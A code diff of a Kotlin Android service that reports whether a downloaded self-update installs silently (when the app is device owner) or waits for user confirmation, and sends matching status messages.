@@ -938,12 +938,18 @@ class MicService : Service() {
                         
                         val versionInfo = UpdateService.checkForUpdate(this@MicService, forceCheck = true)
                         if (versionInfo != null) {
-                            safeSend("""{"type":"update_status","status":"downloading","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize}}""")
+                            val isOwnerInstall = UpdateService.isDeviceOwner(this@MicService)
+                            val installMode = if (isOwnerInstall) "silent" else "user_confirm"
+                            safeSend("""{"type":"update_status","status":"downloading","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize},"installMode":"$installMode"}""")
                             Log.i(TAG, "Update available: ${versionInfo.versionName} (code ${versionInfo.versionCode})")
                             
                             UpdateService.downloadAndInstall(this@MicService, versionInfo)
-                            
-                            safeSend("""{"type":"update_status","status":"installing","version":"${versionInfo.versionName}"}""")
+
+                            if (isOwnerInstall) {
+                                safeSend("""{"type":"update_status","status":"installing","version":"${versionInfo.versionName}"}""")
+                            } else {
+                                safeSend("""{"type":"update_status","status":"awaiting_user_action","message":"Update downloaded. User confirmation required for install."}""")
+                            }
                         } else {
                             safeSend("""{"type":"update_status","status":"up_to_date","currentVersion":"${BuildConfig.VERSION_NAME}","currentCode":${BuildConfig.VERSION_CODE}}""")
                             Log.i(TAG, "No update available — already on latest")
